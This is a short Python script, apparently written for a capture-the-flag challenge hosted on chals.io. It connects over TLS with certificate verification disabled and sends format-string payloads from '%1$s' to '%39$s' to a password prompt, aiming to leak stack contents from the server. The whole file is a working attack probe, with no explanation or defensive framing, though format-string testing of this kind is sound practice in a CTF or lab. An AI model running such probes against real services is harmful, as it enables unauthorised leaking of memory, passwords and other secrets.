import socket
import ssl

HOST = "cybersecurity-apac-psyd-ws01.chals.io"
PORT = 443  # use the same port snicat uses by default (often 443)

# Create an "insecure" SSL context, like snicat's --insecure
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def send_payload(payload: str):
    # Connect
    with socket.create_connection((HOST, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            # Read banner / "Password:" prompt
            data = ssock.recv(1024)
            print("=== SERVER PROMPT ===")
            print(data.decode(errors="ignore"), end="")

            # Send the password guess + newline
            ssock.sendall(payload.encode() + b"\n")

            # Read the response
            try:
                out = ssock.recv(4096)
                print("=== SERVER RESPONSE ===")
                print(out.decode(errors="ignore"), end="\n\n")
            except Exception as e:
                print("Connection closed:", e)

# Brute-force the positional string arguments
for i in range(1, 40):
    fmt = f"%{i}$s"
    print(f"\n[*] Trying payload: {fmt}")
    send_payload(fmt)
